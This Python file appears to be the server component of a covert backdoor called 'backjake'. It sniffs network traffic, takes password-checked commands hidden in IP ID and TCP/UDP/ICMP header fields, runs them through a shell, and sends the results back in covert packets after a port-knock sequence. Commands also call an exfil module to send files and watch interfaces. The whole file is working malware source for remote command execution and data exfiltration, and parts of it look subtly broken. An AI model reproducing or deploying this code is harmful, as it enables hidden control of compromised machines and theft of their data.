import socket
from subprocess import Popen, PIPE
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import backjake
import utils
import exfil

command = ""
pswd = utils.encrypt(config.password)

def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	fltr = "(tcp or udp or icmp) and not (ip src " + str(socket.gethostbyname(socket.gethostname()) + ")")
	cap.setfilter(fltr)

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()

def packetHandler(packet):
	if (authenticated(packet)):
		pacType = utils.checkType(packet)
		ip, protoH, data = utils.stripPacket(packet, pacType)
		checkCommand(ip, protoH, data, pacType)

def authenticated(packet):	
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
	ipIdent = ipHeader[3]

 	if ipIdent == pswd:
 		return True

 	return False

def checkCommand(ip, proto, data, pacType):
	global command
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	if character < 256:
		if character != 15:
			command += chr(character)
		else:
			executeCommand(socket.inet_ntoa(ip[8]), pacType, command)
			command = ""

def executeCommand(srcAddress, pacType, command):
	if command == "?exit" or command == "?quit":
		thread.interrupt_main()
	elif "?intfA " in command:
		exfil.addWatch(command[7:], srcAddress, pacType)
	elif "?intfD " in command:
		exfil.removeWatch(command[7:])
	elif "?file " in command:
		exfil.sendFile(command[6:])
	else:
		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
		sendThread.start()

def sendResults(address, protocol, comm):
	knockCode(address, protocol, True)
	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()

	# encrypt results 
	for c in results:
		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)

	knockCode(address, protocol, False)

def knockCode(address, protocol, openS):
	if openS:
		for k in config.knock:
			packet = IP(dst=address, id=k)
			if protocol == 'tcp':
				proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
			elif protocol == 'udp':
				proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535))
			elif protocol == 'icmp':
				proto = ICMP()
			send(packet/proto, verbose=0)
	# still gotta close

